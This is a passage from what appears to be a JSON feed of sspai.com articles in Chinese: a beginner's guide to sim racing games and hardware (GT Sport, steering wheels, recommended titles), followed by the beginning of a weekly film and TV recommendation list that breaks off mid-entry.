其实有着另外一群耕耘已久的人，他们是开拓者，同样是这个系列中的主角。</p>\n<p>下一章，我们 2005 年开始说起。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68663"},{"title":"入门模拟竞速，你可以从这里开始","date":"2021-09-11 03:33:53","description":"\n<p>在 2020 东京奥运会正式开幕前两个月，意大利选手 Valerio Gallo 在奥运会的历史上又写下了一条新的记录：驾驶丰田 GR Supra 赛车在首都高南内环赛道上创下了 1'55.046 的世界最佳成绩。尽管至今汽车运动是否能够进入奥运会依然存在巨大争议，但不可否认的是，今年首次加入的奥林匹克虚拟系列赛（Olympic Virtual Series，OVS），以及首次入选 OVS 汽车运动项目的模拟竞速软件《Gran Turismo Sport》（GT Sport，GT赛车竞速）都为汽车运动加入奥运大家庭起到了某种程度的破冰作用。</p>\n<p>我本人也在 5 月份注册成为了 OVS 运动员并参加了 OVS 汽车运动项目的预选赛。和一年前的水平一样，我在预选赛上的最佳圈速再次被世界最佳甩开了整整10秒，最终以第 26000 名的成绩完赛。</p>\n<p>这场比赛最终只有 16 位来自世界各地的顶尖选手参加 2021 年 6 月 23 日的总决赛，各路高手都参与到了这场虚拟竞赛决赛入场券的争夺之中，竞争异常激烈。比如有已经多次夺得 FIA 联合索尼旗下 Polyphony Digital 举办的 FIAGTC 全球赛事冠军的热门选手、已经在 F3赛场上征战数年的顶级赛车手，以及专注传播汽车运动文化的知名 YouTuber。</p>\n<p>本届 OVS 的竞赛项目除《GT赛车》外还包括棒球、自行车、赛艇和帆船这四项，其中只有《GT赛车》系列凭借自身影响力，吸引了大量非职业运动员和汽车爱好者的关注，在网络社区上的讨论程度也是最热烈的。毕竟相比其他四项，这场比赛最广泛的传播者，不是运动员，更不是职业车手，而是游戏玩家们。</p>\n<p>说到对驾驶模拟的投入，那些大名鼎鼎的汽车制造商当然是不可忽视的环节。可是对于模拟竞速爱好者而言，汽车制造商在驾驶模拟上如何精雕细琢，或许并不是只靠上网就能轻易获取的知识，因此本文的焦点，是那些消费者和玩家朋友看得见玩得到的<strong>民用模拟竞速软件</strong>。</p>\n<h2>模拟竞速的最佳特色，竟是易于上手</h2>\n<p>关于模拟竞速（Simracing，或者 Sim Racing）的起源和早期历史，<a href=\"https://en.wikipedia.org/wiki/Sim_racing\" target=\"_blank\">维基百科</a> 上资料已十分详细，有兴趣的读者可以转到该页面一窥究竟。</p>\n<p>通常一说起这些民用级的模拟竞速软件，多数玩家朋友首相想到的往往会是微软的<strong>《Forza Motorsport》</strong>（极限竞速）和索尼的<strong>《GT赛车》</strong>这两大系列。之所以这两大系列会被许多人记住，一方面确实是因为 Xbox 和 PlayStation 两大家用机的市场接受度才进入更多玩家的视线；另一方面，这两个系列也分别是微软和索尼各自真正意义上的拳头产品，不论资金投入还是技术投入，每每相比同世代产品都要多。</p>\n<p>除了市场和商业考量之外，这两大系列之所以能被广大玩家接受，一是因为这两个系列对车辆外观与性能的逼真模拟，二是易于上手的体验设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/4204e5914084ff0187fb896454c91dea.png\"><figcaption>《Forza Motorsport 7》照片模式截图，位于斯帕法兰科尚赛道。需要特别注意的是即将推出的《极限竞速地平线5》（Forza Horizon 5）属于开放世界街机游戏《Forza Horizon》系列，并非《Forza Motorsport》模拟竞速系列作品。图片来自本文作者</figcaption></figure><p>在早期的模拟竞速社区里，这两个系列会和真正硬核的模拟竞速软件（如 iRacing、rFactor 等）区分开来，被称为「Simcade」，这个词是「Simulator」和「Arcade」的结合，用于形容物理拟真程度可调，并兼顾一定游玩体验的作品——当然，这种说法正在变得越发小众，现在只要是民用级模拟竞速类型的游戏和软件，大多都会被称作「Simracing」。</p>\n<p>那么，既然是展现技术实力的拳头产品，在体验上也不能太过硬核，导致劝退玩家。因此，这两大系列都有着非常多的驾驶辅助，包括自动换档、转向辅助、刹车辅助、循迹控制辅助、车身稳定辅助、刹车提示以及最佳行车路线等等，玩家在开启这些辅助之后的体验与部分《极品飞车》作品和《火爆狂飙》一类的街机赛车游戏毫无区别甚至更加简单——但是，这种体验也在某种程度上遗漏了这模拟竞速游戏真正的核心：<strong>物理模拟</strong>。</p>\n<h2>认知，是上手模拟竞速的真正门槛</h2>\n<p>可能与许多没有接触过模拟竞速游戏的玩家朋友们想法不同，相比街机类型的赛车游戏，想要在模拟竞速游戏中同 AI 较量，甚至同其他玩家较量，所需的知识储备和技术门槛，要远远比上手模拟器的设备门槛高得多。</p>\n<p>如果是街机类赛车游戏的话，基本只要考虑怎么快速过弯以及怎么把对手挤出赛道就可以了；而在模拟竞速游戏中，因为物理模拟的存在，<strong>玩家要考虑的，和真实赛车手所考虑的，区别基本不大</strong>，这些要考虑的内容包括但不限于：车辆本身的行驶特性、轮胎抓地力、悬挂软硬、行车线路、刹车点参照物、弯道的 CUT<sup class=\"ss-footnote\" href=\"\" title=\"四个轮子完全驶离赛道边界的做法，叫作cut。在一些正式比赛中，开赛前赛事方会说明赛道中哪些弯道可以cut哪些不可以\" footnote-id=\"1\">1</sup> 点、雷达和前后视镜提供的其他车辆位置信息、油量损耗、轮胎损耗，甚至在过某个弯道时要不要开关 TCS<sup class=\"ss-footnote\" href=\"\" title=\"循迹控制系统\" footnote-id=\"2\">2</sup> 和 ABS<sup class=\"ss-footnote\" href=\"\" title=\"防抱死刹车系统\" footnote-id=\"3\">3</sup> 等等。</p>\n<p>这不是每一个模拟竞速游戏与其物理模拟引擎都会提供给玩家的信息，更不是每一个模拟竞速玩家在开始玩一款模拟竞速游戏之前的必修课，但这是上手模拟竞速游戏后，玩家将要体验到的，而且是每时每刻都会体验到的东西。</p>\n<p><strong>从这个角度来讲，在模拟竞速游戏中，胜负从来都是次要的</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/32d0768851b5c87d9620c3f5d7a566a7.jpg\"><figcaption>在有能力追求胜负之前，即便只是攻下一个组合弯道，或者踩着路肩过去轮胎依然保有抓地力所带来的兴奋感，都是模拟竞速玩家所愿意追求的。图片来自本文作者</figcaption></figure><p>正是因为模拟竞速的种种，在一些相对传统的电子游戏社区，玩家对模拟竞速的接受程度确实不如汽车爱好者。「不好玩」「无聊」「枯燥」「太难」是大多游戏玩家对模拟竞速游戏的评价；而愿意享受其中的玩家，大多也只会独自游玩，不会在社群中讨论太多。事实上现在多数的模拟竞速游戏，在游戏性上确实走的还是 20 年前「开破车→跑比赛→获胜获得奖励→解锁新车」的老路，游戏体验的兴奋程度，最多可能只保持 45 分钟；而即便是育碧的开放世界流水线游戏，基本上都能保留5~30小时的兴奋感，因此想要让电子游戏发烧友对模拟竞速游戏产生兴趣，几乎没有可能。<strong>它的门槛不在游戏中，而是在游戏之外。</strong></p>\n<p>也或许是因为模拟竞速不一样的门槛，我遇到的相当一些部分喜欢玩模拟竞速游戏朋友，他们经常开车出行，偶尔下下赛道，平时不怎么玩电子游戏，却一定会有台 Windows PC 或者 PS4，上面装着《神力科莎》（Assetto Corsa）或者《GT Sport》，客厅或者办公室角落里说不定还放着一只入门级的方向盘外设。从跟他们的交谈中我了解到，他们对模拟竞速的认知，和对真车是没有太大区别的。比如在下雨或者疫情封锁不能出门比赛的时候，他们就会拿出方向盘，打开 PC 或者 PS4，玩上一两把，让自己在家的时候也能继续锻炼自己的驾驶技巧。</p>\n<p>一些模拟竞速发烧友还会把之前想在真实世界中没有用上的技巧，先在模拟器上熟悉一下，再返回真实世界<a href=\"https://www.bilibili.com/video/BV1tQ4y1C7vu\" target=\"_blank\">加以运用</a>，让自己在赛道上的表现更加出色——在模拟器上练习之后，在真正的赛道上会更快，是诸多职业赛车手、汽车自媒体和汽车运动爱好者通过自己身体力行验证过无数次的理论。所以<strong>对他们而言，模拟竞速游戏，本来就是汽车世界的一部分，彼此没有区分。</strong></p>\n<p>如果真的要说区别的话，车友们更多也只是调侃般的表示<strong>「只是没有屁股参与其中罢了」</strong>。这句话并不完全是玩笑，因为真车驾驶有很大一部分确实是依靠体感判断车速，依靠屁股感受车身动态的。而在许多入门的模拟器甚至是全球大赛上的模拟器外设，都是不提供体感外设的，因此这种「真实感」确实会大打折扣。但这并不意味着「模拟竞速游戏不真实」，车身的动态确实会在游戏中体现，但传递到玩家身上的，依靠的则是方向盘和手柄的力反馈，以及屏幕上的仪表和车子的行驶路线，而不是完全的体感。因此在模拟竞速中，车手的观察能力和对外设力反馈的敏感程度就显得尤为重要。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/96810384387c318dacedc4936bcaf5ff.jpg\"><figcaption>尼基·劳达的名言「上帝没给我好脑子，但给了我一个感受车子的好屁股。」但在模拟器中，玩家确实无法用屁股来感受车子动态，双手双眼对车子动态的观察就显得愈发重要。图片来自 Google</figcaption></figure><h2>想要更优雅地上手模拟竞速，确实要花点钱</h2>\n<p>如果你确实对汽车很感兴趣并有了一定的知识积累，那么恭喜你，你已经拿到了打开模拟竞速世界的敲门砖。接下来就该选择游玩模拟器的设备了。</p>\n<p>首先要明确的一点是，市面上绝大多数登陆 PC 的模拟竞速游戏都不支持 Mac，所以如果你是 Mac 用户的话，那么需要安装 Windows 系统，或者通过 wine 运行，甚至可能需要寻找一台 Windows PC。按照今年最新的模拟竞速游戏在 Steam 上标注的配置要求，一台搭载四核心处理器、GTX1050 4GB 显卡、16G 内存的电脑是必不可少的基础。</p>\n<p>而如果你的 PC 仅用于生产力，而家用机才是玩游戏的主要力量的话，加之《GT Sport》仅在 PlayStation 主机上发行，我首推的家用机自然是 PS4 Pro 和 PS5。因为《GT Sport》的游戏方式得到了时间和车友们的验证，它是一款对新手非常非常友好，同时上限也极高的驾驶模拟系统。</p>\n<p>外设确实是体验模拟竞速游戏的重要一环，不论在 PC 还是主机上，玩家有许多产品可以选择。不过我个人最推荐的还是自第八世代主机以来，微软和索尼两个大厂的原装手柄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/fa834fcb7bc30a751e610c9c4cad0e93.png\"><figcaption>对于新手而言，微软与索尼的原装手柄依然是最为合适的选择。图片来自 Google</figcaption></figure><p>对于 Windows PC 和 Xbox 玩家，Xbox 为 One 世代以及后续的手柄（包括精英系列）增加了两个线性马达，反映在一部分赛车游戏中，就变成了扣动 LT / RT 键的时候，马达会随着车子油门或者刹车的状态而产生不同程度的震动，相比直接通过眼睛透过显示器观察车子动态，这种更直观的动态感受能给玩家更多的体感，提升玩家对车辆的掌控极限。</p>\n<p>而 DualShock 4 以及与 PS5 搭配的 DualSense 手柄都拥有发源自 DualShock 3 的震动技术，这一技术当然也会在索尼自家的《GT赛车》系列游戏上有着充分体现。在《GT Sport》中，赛道的颠簸、压过路肩导致的轮胎抖动等车身动态，索尼系的手柄都会将这些细碎的反应以不同频次的震动传递到玩家手中，玩家可以感受到车子在赛道中行走时带来的丰富反馈，使得玩家更愿意细腻地控车。</p>\n<p>Xbox One 世代手柄和 DualShock 4 的价格都在 180~350 元上下浮动，Xbox Series 手柄和 DualSense 的价格则都在 500 元上下，所以想要入门模拟竞速，这个门槛确实会卡住一些预算紧张的学生党和上班族；Xbox 精英手柄的价格在 1300 元左右，而且对于入门玩家而言，较大的重量可能反而会成为掣肘，因此并不推荐。</p>\n<p>如果你的室内空间有一定余裕，并且希望拥有更进一步的模拟竞速体验，那么带有力回馈功能的方向盘一定是不可或缺的外设。目前市面上受众较广的力回馈方向盘的驱动方式大致分为三类：</p>\n<ul>\n<li>以罗技为代表的齿轮电机</li>\n<li>以图马斯特为代表的皮带无刷电机</li>\n<li>以 <a href=\"https://www.bilibili.com/video/BV1VP4y1Y7So\" target=\"_blank\">FANATEC</a> 和 Simagic 为代表的直驱电机</li>\n</ul>\n<p>罗技的齿轮电机产品找到了价格和耐用性的平衡点，大多数对模拟竞速有兴趣但预算有限的玩家都会选择罗技。即将退市的罗技 G29/G920 方向盘套装在 1699~2000 元左右，去年推出的 G923 方向盘套装价格在 3000~3700 元左右。这些方向盘有一个明显的缺点，是电机扭力相对有限，以及初始几度会有转向死区。因此像是在《神力科莎：争锋》（Assetto Corsa Compatizione）这样物理模拟更丰富的模拟软件上，不能提供完整的力反馈和指向精度，在驾驶GT4级别赛车的时候会出现严重的失真情况；不过由于《GT Sport》针对 G29 方向盘进行了专门调教，上述问题在《GT Sport》中不会出现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/6b217eec516f3c735e67a3242e3e511c.png\"><figcaption>不同于 G29/G920 的命名方式，新款的罗技方向盘不论 Xbox 版还是 PS 版都被称为 G923。图片来自 Nation4Gamers</figcaption></figure><p>图马斯特的无刷电机由于调教和选料的不同，衍生出了不同等级的产品。入门级的 T150RS 价格在 1600 元上下，进阶级的 T300RS/GT 价格在 3000~4000 元左右，专为《GT Sport》赛事调教的 T-GT 系列方向盘则需要 6000 元以上，顶级的 TS-XW 方向盘则需要 7000 元，十分接近国产直驱电机方向盘的价格。图马斯特系方向盘的缺点在于由于是皮带轮传动系统，因此品控和耐用性都不如罗技，买到高质量方向盘的情况多数都是碰运气。另外，有传言称图马斯特会在近期推出直驱电机驱动的方向盘，有兴趣的玩家不妨期待一下。</p>\n<p>直驱电机由于采用工业电机的转轴直接驱动盘面，不需要多余的传动系统进行扭矩放大，因此相比齿轮电机和无刷电机，模拟竞速游戏中的车辆反馈会更直接、更干净地传递给玩家；另外，直驱电机的最大扭矩可以做到比真车更大，因此相当一部分真正的赛车手正确确实实地采用直驱电机模拟器来提升自己的驾驶能力。但与此同时，想要获得一套好的直驱电机模拟器体验，1 万 ~ 3 万元的设备支出（直驱电机、方向盘盘面、踏板、排挡杆、竞技手刹、方向盘支架、赛车椅等等），以及足够的室内空间都是必不可少的；同时，对于不同游戏，也需要认真设定直驱电机产品的力反馈强度，否则会出现因电机扭力过大而危及玩家生命安全的情况。</p>\n<h2>你可以先从这里开始模拟竞速之旅</h2>\n<p>说完了硬件，接下来说说软件。由于相当一部分模拟器依然有着“游戏”的属性，许多家用机上都能玩到不少的模拟竞速作品。当然，基于个人喜好和对模拟程度好坏的抉择，我推荐的主要是我自己玩过、有好感的游戏。</p>\n<h3>《GT赛车》系列</h3>\n<p><i>平台：PS3 / PS4 / PS5</i></p>\n<p>对于所有想要尝试模拟竞速游戏的玩家和读者，我觉得不光是我，只要是玩过多平台，一定数量模拟竞速游戏的朋友，最先推荐的应该还是《GT赛车》系列。</p>\n<p>这里的《GT赛车》系列严格来说指的是《GT5》《GT6》和《GT Sport》这三款游戏，这三款游戏都能给到玩家「保姆级」的模拟竞速入门体验。这三款游戏都包含了驾校模式，从汽车驾驶最最基础的刹车教学，到「外内外」走线课程，再到油箱即将耗尽如何控油跑完单圈这样的专业驾控能力，在《GT赛车》的驾校模式中应有尽有。PS4 上的《GT Sport》甚至更进一步，将游戏中几乎所有赛道的教程写到了游戏的「环道赛体验」模式中，不论是模拟竞速新手还是老司机，这个模式都属于实打实的「干货+实操」课程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/98dbbd403a40fe05995628db548f1a57.png\"><figcaption>《GT Sport》环道赛体验模式右侧的详细赛道解读。与真实纽堡林北环的攻弯教程没有什么差别。图片来自本文作者</figcaption></figure><h3>《GRID Autosport》</h3>\n<p><i>平台：Nintendo Switch / 手机 / PC / Xbox360 / PS3</i></p>\n<p>《GRID Autosport》本是 PC 端的模拟驾驶游戏，最早发行于 2014 年，但是 Codemasters 把这款游戏分别移植到了 Nintendo Switch 和手机上。这款游戏在教程上没有《GT赛车》系列那么「保姆」，但是因为AI有个「非常简单」的难度，玩家可以在轻易找到成就感的同时，或多或少学习到一些关于驾驶的知识，比如走线，以及有敌车情况下的进攻与防守。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/39bf91d8154cf7234738ecdaf3c5b694.jpg\"><figcaption>采用 ego 引擎打造的《GRID Autosport》画面相当出色。图片来自 Google</figcaption></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/57877\" target=\"_blank\">移动端画质最好的竞速游戏，模拟与娱乐玩家都能乐在其中：GRID Autosport</a></p>\n<h3>《极品飞车：街道争霸》（Need for Speed Prostreet）</h3>\n<p><i>平台：PC / Xbox360 / PS3 / NDS</i></p>\n<p>这款游戏在一部分玩家群体中颇具争议，但对我而言《极品飞车：街道争霸》是 NFS 系列游戏中不可磨灭的存在。它是 Black Box 工作室首次尝试 Simcade 类型的赛车游戏，而事实上从之后的模拟竞速游戏来看，不论是游戏玩法，还是在拟真和爽快的平衡性上做到了 NFS 系列的历代最佳。虽然由 Slightly Mad Studios 操刀的《NFS Shift》是我的模拟竞速启蒙之作，但是在玩过了足够多的模拟竞速游戏之后，我认为只有《极品飞车：街道争霸》才是有着 NFS 真正内核，同时为 NFS 系列延展出新可能性的先锋作品。在一些小众的竞速游戏狂热者群体中，《极品飞车：街道争霸》甚至有着「NFS之王」的美称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/5261fd271427d2b71a9ee657bc88c053.png\"><figcaption>不仅仅是美女，疯狂的改装选项，合法的街头赛车，以及平衡爽快和拟真的物理引擎更是为这款游戏锦上添花。图片来自 SteamGridDB</figcaption></figure><h3>《WRC 4: FIA World Rally Championship》</h3>\n<p><i>平台：PC / Xbox360 / PS3 / PSV</i></p>\n<p>Milestone srl 是我非常喜欢的一家模拟竞速软件开发商，《WRC4》官方游戏则是他们接棒索尼旗下第一方 Evolution Sudio《WRC》官方游戏之后的第四部作品，同时也是最老的能在 Steam 平台上购买即玩的 WRC 官方游戏。这个系列如同其他官方游戏一样属于每年都会发售新品的年货，因此非发烧友需要酌情购买。《WRC4》官方游戏对配置要求很低，在辅助全关的状态下车子依然有足够的抓地力，对于初识拉力赛模拟的玩家十分友好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/0ce917836cace6b7a9770326488113f3.jpeg\"><figcaption>《WRC4》官方游戏配置要求低，操作相比新作街机感更强，但这意味着对模拟竞速新手更加友好。图片来自 Humble Bundle</figcaption></figure><h3>《KartKraft》</h3>\n<p><i>平台：PC</i></p>\n<p>这是一款真正意义上的民用级卡丁车模拟竞速软件。没有多余的悬挂，只有纯粹依靠连杆转向的卡丁车和全激光扫描的真实赛道；没有多余的模式，只有练习、对抗和线上竞技模式。如果你开过卡丁车，那么这款模拟器可以零门槛上手；如果你没有开过卡丁车，那么这款模拟器能让你零门槛驾驶真实的卡丁车。关于《KartKraft》，我曾专门写过<a href=\"https://www.gcores.com/articles/134524\" target=\"_blank\">一篇评测</a>，感兴趣的读者可以看一看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/3d303836a91be846f1356a39e9a8e171.jpeg\"><figcaption>《KartKraft》可爱的粉色主题挡不住凌厉的驾驶气势。图片来自Humble Bundle</figcaption></figure><h3>《尘埃拉力赛》（DiRT Rally）</h3>\n<p><i>平台：Mac / PC / Xbox One / Xbox Series / PS4 / PS5</i></p>\n<p>在Mac上，原生的硬核模拟竞速游戏确实有一款，那就是《尘埃拉力赛》。这款游戏被硬核玩家戏称为「四轮黑魂」，也是因为其几近真实的拉力赛车物理模拟，和变幻莫测的赛道构成。因此，这并不是适合模拟竞速新手接触的模拟竞速游戏。所以想要从易到难，一步一步地挑战自我，还是要从家用机和 Windows PC 上的游戏开始。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/6e6a8edab3d02138569cfe1b138f4c71.jpg\"><figcaption>《尘埃拉力赛》对玩家而言是Codemasters第一次正视汽车运动的作品，同时更是一部难到极致的模拟竞速游戏。图片来自Codemasters</figcaption></figure><p>其实在软件和游戏这里，还有许许多多值得体验的游戏没有提到，比如《GRID Autosport》的前辈《Race Driver GRID》，同样饱受争议的《NFS Shift》系列，还有微软的当家产品《Forza Motorsport》系列以及其衍生的开放世界作品《Forza Horizon》系列，后起之秀《赛车计划》系列，以及新的模拟竞速王者《神力科莎》，我其实也非常推荐大家去玩。这些游戏也各有特色，一些游戏兼顾了游戏性，一些游戏的物理引擎有着独特之处，一些则有着大量的 mod 支持，但同时也非常硬核。</p>\n<p>这也意味着，其中一些相对硬核的模拟竞速游戏，甚至包括文中反复提及的《GT Sport》都不太能给予玩家「电子游戏」一般的快乐，而是另一种将所学到的课外知识加以运用，并持续精进，最终突破自我获得成就感的过程。想要获得这种成就感是一件困难的事情，他不仅需要兴趣和热情，更需要反复地练习和总结。</p>\n<p>然而实际上，这个过程只有对于不理解的人而言才会认为很乏味，如果你确实在驾驶的过程中不断学习，为每一次成功的攻弯感到兴奋和荣耀，那么这些模拟竞速游戏也一定会为你带来长久的愉悦和满足。</p>\n<p><i>*本文头图来自笔者的GT OVS预选赛录像</i></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68317"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-09-10 09:54:45","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[西班牙剧] 纸钞屋 第五季、[电影] 宝可梦：皮卡丘和可可的冒险、[纪录片] 好好拍电影、[韩剧] 海岸村恰恰恰、[美剧] 奥卡菲娜是来自皇后区的诺拉 第二季、[美剧] 致命点击、[动画] 爱与演唱会!超级明星!!、[美剧] 美国犯罪故事 第三季</li>\n<li>几则精彩预告：《黑客帝国：矩阵重启》公布首支正式预告，12 月上映、「小李子」主演，《不要抬头》12 月 24 日登陆 Netflix、恐怖惊悚片《Soho 区惊魂夜》发布中文预告，10 月 29 日北美上映</li>\n<li>几则影视资讯：郑渊洁同名作品改编电影《皮皮鲁与鲁西西之罐头小人》定档<strong> </strong>9 月 30 日上映、《海贼王》真人剧集将登陆 Netflix、漫改 TV 动画《鬼灭之刃 花街篇》将于秋冬之际播出、《黑道家族》前传电影《纽瓦克众圣》10 月 1 日登陆北美院线及 HBO Max</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[西班牙剧] 纸钞屋 第五季（上半部）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/d8612677ec8df16abc71d868e5a49624\"></figure><p>关键词：动作 / 犯罪 / 悬疑</p>\n<p>片长：50 分钟（单集）× 5 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/80192098\">Netflix</a>；<a href=\"https://movie.douban.com/subject/35162581/\">豆瓣链接</a></p>\n<blockquote><p>人有很多段人生，我们的灵魂也可以在路上继续逃亡。</p></blockquote>\n<p>@潘誉晗：作为网飞爆款，这部讲述抢劫国家银行然后造福人民的剧集一出手就很不一样，不光迅速登顶烂番茄，同时也引发了大量讨论。本季的剧本明显恢复了前两季干净利落的风格，在节奏上也更加紧凑。被抓捕的教授破天荒的没有留下后备计划，失去了核心领导人物的团队也处于内忧外患之中，三军混乱，谁又可以成为最后的赢家？</p>\n<p>大热西班牙语剧《纸钞屋》还是迎来了最终季，这次网飞先放出了上半部的五集让观众们过过瘾，接下来下半部的五集，将在12 月 3 日的时候播出。虽然只播出了短短五集，但已经吊足了胃口。红色工装果然很帅！抢钱、抢劫、枪战显然已经不能满足大伙，疯起来的女人即使生了孩子也不会收敛身上的那股倔强劲和戾气，岂一个「爽」字就可轻易概括？期待本剧下半部的播出。</p>\n<h3>[电影] 宝可梦：皮卡丘和可可的冒险</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/24dfc2480d03ff381d8ad25d84252f4e\"></figure><p>关键词：剧情 / 冒险 / 成长</p>\n<p>片长：98 分钟</p>\n<p>观看渠道：院线上映中；<a href=\"https://movie.douban.com/subject/34943015/\">豆瓣链接</a></p>\n<blockquote><p>我是人类，也是宝可梦！</p></blockquote>\n<p>@SHY：二十余载风风雨雨一路走来，近几年的宝可梦动画似乎在淡化小智的中心地位——当然，我不是在说《<a href=\"https://movie.douban.com/subject/34431687/\">旅途</a>》。从《<a href=\"https://movie.douban.com/subject/34929840/\">破晓之翼</a>》到《<a href=\"https://www.douban.com/search?cat=1002&amp;q=POK%C3%89TOON\">POKÉTOON</a>》系列，没有小智登场的几部短篇收获了众多好评；剧场版也在尝试转型，《<a href=\"https://movie.douban.com/subject/26937474/\">就决定是你了！</a>》重启之后，风格焕然一新，最新作《可可》更是完全以原创角色为主轴展开。被宝可梦萨戮德抚养长大的少年可可，能理解宝可梦的语言，也自以为是宝可梦，在奥克雅森林中自由自在地生活着。意外溺水，被小智救下后，他第一次来到人类社会，发觉自己的身世并没有那么简单。追查亲生父母踪迹的冒险，却最终招致整座森林的危机，为了守护伙伴与大自然，可可、小智和宝可梦们挺身而出。</p>\n<p>不受 TV 版的人际关系制约，将视角转向人类与宝可梦间的羁绊，让本作更接近一部独立的原创动画电影，即使没接触过宝可梦系列，也能轻松进入状态。平心而论，《可可》的故事并不新颖，设定处处充斥着既视感，反派一望即知，且塑造单薄，缺乏反转的冲击力。然而，电影对于超越血缘的亲情、种族平等、环境保护等母题的探索却带来了更多人文内涵，加上从不缺席的爱与勇气的少年冒险，氛围积极向上，结尾满溢感动。高质量的作画与音乐、有一定深度的立意， 这无疑是近几年综合素质最高的宝可梦剧场版，相信大朋友和小朋友们都能收获一次愉悦的观影体验。</p>\n<h3>[纪录片] 好好拍电影</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/eaee81b10f3517c572ef200ab74a06cf\"></figure><p>关键词：许鞍华 / 香港电影</p>\n<p>片长：111 分钟；<a href=\"https://movie.douban.com/subject/35158157/\">豆瓣链接</a></p>\n<blockquote><p>「勤力係無燃用的。」</p></blockquote>\n<p>@甜約翰：《好好拍电影》记录了香港导演许鞍华的工作与生活日常，在片中我们不仅能看到其 40 余载的光影人生，也能看到她与母亲的感情羁绊，还能看到作为导演的许鞍华在文化夹缝中的自我求索，最终呈现出一位纯粹、笨拙、「不合时宜」的电影创作者，以及一段有关香港电影和香港电影人的故事。</p>\n<p>《好好拍电影》的导演文念中是与许鞍华合作过《明月几时有》《男人四十》等多部影片的美术指导，所以本片的镜头总是带着情感的，片中影像资料和生活片段的互文十分有趣，搭配着徐克、施南生、侯孝贤、吴念真、贾柯樟、田壮壮、萧芳芳、刘德华、林嘉欣等多位老友的访谈，轻松又有趣，温柔而真诚。</p>\n<p>作为香港电影新浪潮的代表人物，以及全球首位获得威尼斯终身成就奖的女导演，看完本片，你可能更能理解其作品中的人文关怀、女性视角和文化反思，以及为什么她说「电影是老婆，文学是情妇」，当然也会被烟不离手、偶尔「容貌焦虑」、保有「少女心」的许鞍华可爱到，可当看到她在颁奖典礼上喊出那句「电影万岁」时，又会被感动得一塌糊涂。自私地希望所有像许鞍华导演这样的创作者能够一直「坚持」下去，正如本片的片名一样——Keep Rolling！</p>\n<h3>[韩剧] 海岸村恰恰恰</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/7b7a5ebace335a0ddc131e93a117b4fe\"></figure><p>关键词：剧情 / 爱情</p>\n<p>片长：70 分钟（单集）× 16 集；<a href=\"https://movie.douban.com/subject/35296153/\">豆瓣链接</a></p>\n<blockquote><p>祝愿每个女孩子都可以遇到拿着水晶鞋来的「洪班长」。</p></blockquote>\n<p>@潘誉晗：看不惯院长忽略病患只重视钱的做法，牙医尹慧珍（申敏儿饰）来到了海边小村开牙医诊所，在这里，她认识了一位看似无所不能的洪班长（金宣虎饰）。</p>\n<p>一部非常温馨的浪漫爱情喜剧，虽然只是一个海边小村，可里面满满的人情味让人看了就觉得心中好温暖。老奶奶三人组虽然有点年纪了，可是干起活来依然利索，每天就在岸边处理鱿鱼，虽然琐碎，可她们一直笑呵呵；昔日咖啡酒吧的歌手在自己的小天地里弹着吉他唱着歌，在海边小村回忆曾经的过往，也很自在；还有看上去是无业游民但却能胜任一切的洪班长，打着各种各样的零工的自由人，虽然薪水不高，却自在逍遥。这和名牌大学毕业，一直习惯了在都市打拼的生活完全不一样，可就是这样的反差，却让她心中收获了更多她曾经没有获得过的力量。</p>\n<p>美丽的医生，潇洒的自由人，温暖的村中人，连风中也飘着海水味的动人海岸村，不如一起来剧中体验一下吧。</p>\n<h3>[美剧] 奥卡菲娜是来自皇后区的诺拉 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/da06dd89f1c59f4eb6490acb9df51dfc\"></figure><p>关键词：喜剧 / 都市</p>\n<p>片长：约 20 分钟（单集）× 10 集；<a 